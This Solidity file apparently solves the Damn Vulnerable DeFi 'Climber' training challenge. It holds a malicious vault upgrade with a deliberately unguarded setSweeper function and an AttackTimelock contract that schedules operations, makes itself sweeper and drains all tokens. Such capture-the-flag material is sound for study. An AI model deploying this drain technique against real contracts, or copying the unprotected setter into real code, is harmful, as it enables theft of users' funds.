// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";
import "../DamnValuableToken.sol";
import "../climber/ClimberTimelock.sol";


contract AttackVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        require(msg.sender == _sweeper, "Caller must be sweeper");
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize(address admin, address proposer, address sweeper) initializer external {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        setSweeper(sweeper);
        _setLastWithdrawal(block.timestamp);
        _lastWithdrawalTimestamp = block.timestamp;
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
        require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");

        _setLastWithdrawal(block.timestamp);

        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Transfer failed");
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress) external onlySweeper {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    // Changed set sweeper to public so our EOA can set a new sweeper
    function setSweeper(address newSweeper) public {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _setLastWithdrawal(uint256 timestamp) internal {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}



contract AttackTimelock {
    address vault;
    address payable timelock;
    address token;

    address owner;

    bytes[] private scheduleData;
    address[] private to;

    constructor(address _vault, address payable _timelock, address _token, address _owner) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory data) external {
        to = _to;
        scheduleData = data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](to.length);
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        AttackVault(vault).setSweeper(address(this));
        AttackVault(vault).sweepFunds(token);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        DamnValuableToken(token).transfer(owner, DamnValuableToken(token).balanceOf(address(this)));
    }
}